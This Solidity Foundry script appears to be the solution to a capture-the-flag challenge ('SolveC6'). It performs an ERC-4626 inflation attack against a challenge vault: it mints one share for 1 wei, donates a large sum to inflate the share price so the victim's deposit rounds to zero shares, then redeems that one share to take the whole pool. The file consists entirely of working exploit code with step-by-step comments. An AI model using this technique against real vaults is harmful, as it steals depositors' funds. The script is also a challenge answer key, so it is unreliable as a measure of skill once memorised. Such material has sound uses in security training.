// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C6Shares.sol";

/// ERC-4626 inflation: mint 1 share for 1 wei, donate to inflate the share
/// price so the victim's deposit rounds to 0 shares, then redeem the 1 share
/// to take the whole pool.
contract SolveC6 is Script {
    function run() external {
        SharesSetup setup = SharesSetup(vm.envAddress("SETUP"));
        Asset asset = setup.asset();
        Vault4626 vault = setup.vault();

        vm.startBroadcast();
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1);                              // 1 wei -> 1 share
        asset.transfer(address(vault), 10000 ether);   // donate -> inflate price
        setup.victimDeposit();                         // victim deposits -> 0 shares
        vault.redeem(1);                               // redeem -> whole pool
        vm.stopBroadcast();
    }
}
